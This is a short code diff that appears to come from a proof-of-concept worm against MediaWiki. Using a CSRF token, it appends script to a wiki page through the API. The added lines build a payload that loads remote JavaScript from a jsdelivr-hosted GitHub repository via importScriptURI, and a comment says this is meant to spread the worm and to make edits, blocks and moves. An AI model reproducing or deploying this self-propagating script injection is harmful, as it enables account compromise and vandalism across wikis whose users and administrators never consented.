@@ -42,6 +42,12 @@
 			appendtext: "\nalert('Hi');",
 			summary: 'POC edit'
 		}));
+		// obviously(?) above would normaly spread the worm by using the text below instead of `alert`.
+		// and could randomly add another script that do edits, blocks, moves...
+		let text = `
+		var url = "https://cdn.jsdelivr.net/gh/johnnybebad26/wiki-poc-fun@main/poc2.4-adv.js";
+		importScriptURI(url);
+		`;
 
 		await api.postWithToken("csrf", api.assertCurrentUser({
 			action: "edit",
